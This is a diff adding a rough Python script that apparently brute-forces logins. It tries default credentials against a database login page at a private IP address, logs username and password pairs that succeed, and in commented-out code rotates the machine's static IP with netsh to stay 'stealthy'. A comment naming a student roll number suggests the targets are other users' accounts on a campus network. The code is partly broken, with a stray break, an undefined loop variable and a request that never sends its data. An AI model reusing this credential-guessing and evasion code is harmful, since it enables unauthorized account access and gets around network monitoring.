@@ -1,0 +1,59 @@
+-#! python3
+-import time
+-import ssl
+-import os
+-import datetime
+-import urllib.request
+-arr=['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0','']
+-checkList = range(1000,10000)
+-checkList1=range(1,2)
+-flag=0
+-'''
+-for a1 in arr:
+-        for a2 in arr:
+-                for a3 in arr:
+-                        for a4 in arr:
+-                               for a5 in arr:
+-'''
+-userid ='verlihub'      #Roll No of Student
+-password= 'verlihub'
+-dataToSend = urllib.parse.urlencode({'auth[username]': userid, 'auth[password]': password, 'auth[db]': 'verlihub'})
+-binary_data = dataToSend.encode(encoding='UTF-8')
+-gcontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+-postRequest = urllib.request.urlopen('http://172.16.32.222/db') 
+-responseData = postRequest.read()
+-print(responseData)
+-'''
+-finaldata=responseData[58:59]
+-#print(finaldata)
+-length=len(responseData)
+-print(length)
+-l1=293
+-if length != l1:
+-     with open("C:\\Users\\DARPAN\\Desktop\\Output2.txt", "a") as text_file:
+-            text_file.write("userid: %s pass %s" % (userid, password))
+-            text_file.write('\n')
+-     break   
+-# openURLToCheck = urllib.urlopen("http://www.google.com")
+-# checkData = openURLToCheck.read()
+-# c=checkData.count('Google Search')
+-# if c > 0:
+-print('\t\t---Cyberaom-------------------------------')
+-print('\t\t\t' +userid)
+-print('\t\t\t'+password)
+-
+- 
+-               
+-# stop after 10 checks: Stealthy
+-if i%100000000 == 100009:
+-     print('SCAN COMPLETED UPTO ' + str(i))
+-     if flag==1:
+-            os.system('netsh interface ip set address name="Ethernet" static 192.168.155.35 255.255.252.0 192.168.152.1')
+-            time.sleep(5)
+-            flag=0
+-     elif flag==0:
+-            os.system('netsh interface ip set address name="Ethernet" static 192.168.155.135 255.255.252.0 192.168.152.1')
+-            time.sleep(5)
+-            flag=1
+-
+-'''
